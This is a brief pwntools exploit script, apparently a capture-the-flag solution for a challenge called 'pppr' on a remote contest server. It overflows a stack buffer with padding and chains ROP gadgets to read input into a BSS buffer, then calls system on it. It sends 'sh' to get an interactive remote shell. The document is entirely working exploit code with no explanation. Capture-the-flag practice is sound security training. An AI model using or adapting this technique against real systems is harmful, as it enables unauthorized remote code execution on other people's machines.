from pwn import *

prob = "./pppr"

bin = ELF(prob)

p = remote("pppr.sstf.site", 1337)

pppr = 0x080486a9

pl = b"A"*(8+4)
# r(buf_in_bss, 0x777, 0)
pl += p32(bin.symbols["r"]) + p32(pppr) + p32(bin.symbols["buf_in_bss"]) + p32(0x777) + p32(0)
# system(buf_in_bss)
pl += p32(bin.plt["system"]) + b"B"*4 + p32(bin.symbols["buf_in_bss"])
assert not b"\x0a" in pl
p.sendline(pl)

pl = b"sh"
p.sendline(pl)

p.interactive()